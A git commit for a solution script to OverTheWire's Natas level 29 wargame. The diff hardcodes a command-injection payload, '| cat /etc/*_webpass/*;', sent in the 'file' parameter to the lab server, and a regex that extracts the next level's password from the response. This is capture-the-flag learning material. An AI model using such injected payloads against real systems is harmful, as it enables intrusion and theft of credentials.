1fe874ce241af7c9ceb6128cf1dcf0b90d6a2a53
Taldgan <bananaphone993@live.com>
2020-08-23 13:22:02 -0500

    natas29 solved

--- natas/rerun/scripts/natas29solution.py
+++ natas/rerun/scripts/natas29solution.py
@@ -1,4 +1,3 @@
-import sys
 import subprocess
 import re
 import requests
@@ -8,15 +7,13 @@ def inject_payload():
     #Username and Password for natas website/level
     passw = subprocess.run(['getpass', '29'], stdout=subprocess.PIPE).stdout.decode('utf-8')
     auth = HTTPBasicAuth('natas29', passw.strip())
-    space = " "
     #Get request to website, creates object that contains a .text property
     #text property holds the html of the webpage
-    payload = {'file':sys.argv[1]}
+    payload_string = "| cat /etc/*_webpass/*;"
+    payload = {'file':payload_string}
     r = requests.get('http://natas29.natas.labs.overthewire.org/', auth=auth, params=payload)
     passreg = '[a-zA-Z0-9]{32}'
-    #print(re.findall(passreg, r.text)[0])
-    #print(r.text[r.text.find('<pre>'):])
-    print(r.text)
+    print(re.findall(passreg, r.text)[2])
 
 if __name__ == "__main__":
     inject_payload()
